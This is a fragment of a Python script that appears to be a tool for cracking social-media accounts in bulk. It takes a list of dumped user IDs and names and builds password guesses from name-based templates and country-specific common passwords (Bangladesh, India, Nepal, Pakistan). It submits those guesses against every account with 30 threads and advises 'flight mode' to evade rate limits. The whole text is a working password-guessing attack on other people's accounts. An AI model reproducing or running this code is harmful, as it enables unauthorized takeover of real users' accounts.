                    '57273200', '@firstlast@', 'first@123',
                    'firstlast123', 'firstlast@123', 'bangladesh',
                    'bangla123', 'dhaka123', 'bd123456'
                ])                
                
            elif auto_choice in ['2','02']:
                # India Auto Passwords
                pw.extend([
                    'first last', 'firstlast', 'first123', 'last123',
                    '57273200', '59039200', '57575751', '07860786',
                    '57575752', 'first@123', 'firstlast123',
                    'first@1234', 'last@123', 'firstlast@123',
                    'india123', 'indian', 'mumbai', 'delhi123',
                    'punjab123', 'kolkata', 'chennai', 'hyderabad'
                ])
                
                
            elif auto_choice in ['3','03']:
                # Nepal Auto Passwords
                pw.extend([
                    'first@123', 'first@12345', 'first123', 'first12345',
                    'firstlast', 'first last', 'firstlast123', '@first123',
                    'first123@', 'first@1234', 'First@123', 'First@12345',
                    'lastfirst', 'firstlast12345', 'last@123'
                ])
                
                
            elif auto_choice in ['4','04']:
                # Pakistan Auto Passwords
                pw.extend([
                    'first last', 'firstlast', 'first123', 'last123',
                    'first@123', 'firstlast123', 'pakistan', 'karachi',
                    'lahore123', 'islamabad', 'pak123', 'quetta',
                    'peshawar', 'pak@123', 'first@1234', 'last@123',
                    '57273200', '57575751', 'firstlast@123'
                ])
                
            else:
                print('\n Select valid option ... ')
                time.sleep(2)
                return self.pasw()
                
        elif ppp in ['2','02']:
            # Self Password Input
            print('Put limit between 1 to 30')
            sl = int(input('How many password do you want to add?: '))
            os.system("clear")
            print(logo)
            print('\x1b[1;37m [Example: first123,last1122,firstlast,last,ETC]')
            linex()
            if sl > 30:
                print('\nPassword limit Should Not Be Greater Than 30')
                sl = 30
            for sr in range(sl):
                pw.append(input(f'Password {sr+1}: '))
            print(f"\x1b[1;97m [SELF PASS] {len(pw)} \x1b[1;37m")
        else:
            print('\n Select valid option ... ')
            time.sleep(2)
            return self.pasw()

        time.sleep(2)
        os.system("clear")
        print(logo)
        print("\r\x1b[38;5;208m USE FLIGHT MODE FOR BEST RESULT \x1b[1;37m")
        linex()
        print(f'\033[93m TOTAL DUMP IDS : %s ' % len(self.id))
        print(f'\033[93m TOTAL PASSWORDS : %s ' % len(pw))
        linex()                       
        
        with sarfrazssb(max_workers=30) as ssbworld:
            for zsb in self.id:
                try:
                    uid, name = zsb.split('|')
                    sz = name.split(' ')
                    if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                        pwx = pw
                    else:
                        pwx = pw
                        
                    if 'methodA' in methods:
                        ssbworld.submit(self.methodA, uid, name, pwx)
                    elif 'methodB' in methods:
                        ssbworld.submit(self.methodB, uid, name, pwx)
                    elif 'methodC' in methods:
                        ssbworld.submit(self.methodC, uid, name, pwx)                    
                except:
                    pass
                    
        result(oks, cps)
            

